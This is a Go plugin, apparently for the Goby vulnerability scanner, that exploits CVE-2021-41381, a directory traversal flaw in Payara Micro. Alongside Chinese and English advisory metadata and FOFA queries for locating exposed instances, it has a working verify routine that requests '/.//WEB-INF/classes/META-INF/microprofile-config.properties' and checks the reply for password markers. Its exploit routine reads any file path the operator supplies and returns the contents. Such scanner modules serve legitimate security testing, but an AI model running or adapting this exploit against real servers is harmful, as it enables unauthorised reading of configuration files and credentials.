package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Payara Micro Community Information Leakage (CVE-2021-41381)",
    "Description": "<p>Payara Micro Community is the lightweight middleware platform of choice for containerized  Jakarta EE  application deployments.</p><p>Payara Micro Community 5.2021.6 and below allows Directory Traversal. Attackers can obtain sensitive information such as service configuration, leading to system takeover.</p>",
    "Impact": "Payara Micro Community Information Leakage (CVE-2021-41381)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.payara.fish\">https://www.payara.fish</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Payara-Micro",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Payara Micro 中间件社区版信息泄露漏洞（CVE-2021-41381）",
            "Description": "<p>Payara Micro 社区版是容器化 Jakarta EE 应用程序部署的首选轻量级中间件平台。</p><p>Payara Micro 中间件社区版 5.2021.6 及以下版本存在目录遍历漏洞，攻击者可以获得服务配置等敏感信息，导致接管系统。</p>",
            "Impact": "<p>Payara Micro 中间件社区版 5.2021.6 及以下版本存在目录遍历漏洞，攻击者可以获得服务配置等敏感信息，导致接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.payara.fish\">https://www.payara.fish</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Payara-Micro",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Payara Micro Community Information Leakage (CVE-2021-41381)",
            "Description": "<p>Payara Micro Community is the lightweight middleware platform of choice for containerized  Jakarta EE  application deployments.</p><p>Payara Micro Community 5.2021.6 and below allows Directory Traversal. Attackers can obtain sensitive information such as service configuration, leading to system takeover.</p>",
            "Impact": "Payara Micro Community Information Leakage (CVE-2021-41381)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.payara.fish\">https://www.payara.fish</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "Payara-Micro",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(title=\"Payara Micro\") || banner=\"Payara Micro\"",
    "GobyQuery": "(title=\"Payara Micro\") || banner=\"Payara Micro\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.payara.fish/",
    "DisclosureDate": "2021-10-04",
    "References": [
        "https://www.exploit-db.com/exploits/50371"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2021-41381"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/WEB-INF/classes/META-INF/microprofile-config.properties",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Payara-Micro"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10230"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/.//WEB-INF/classes/META-INF/microprofile-config.properties"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.RawBody, "security.openid.default.providerURI=") || strings.Contains(resp.RawBody, "Submission") || strings.Contains(resp.RawBody, "password"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/./" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
